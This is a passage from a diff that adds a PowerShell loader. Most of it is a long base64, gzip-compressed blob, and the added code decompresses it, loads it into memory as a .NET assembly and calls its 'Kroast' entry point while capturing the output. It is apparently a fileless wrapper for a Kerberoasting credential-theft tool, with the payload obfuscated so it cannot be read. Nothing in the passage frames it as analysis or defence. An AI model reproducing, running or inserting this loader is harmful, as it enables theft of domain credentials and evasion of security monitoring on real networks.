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"))
+    $gzipStream = New-Object IO.Compression.GzipStream($kr, [IO.Compression.CompressionMode]::Decompress)
+    $memStream = New-Object System.IO.MemoryStream
+    $gzipStream.CopyTo($memStream)
+    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
+    $currentConsoleOutput = [Console]::Out
+    $textWriter = New-Object IO.StringWriter
+    [Console]::SetOut($textWriter)
+    [Kroast.Program]::Main([string[]]$args)
+    [Console]::SetOut($currentConsoleOutput)
+    $textWriter.ToString() | Write-Output
 }
 '@
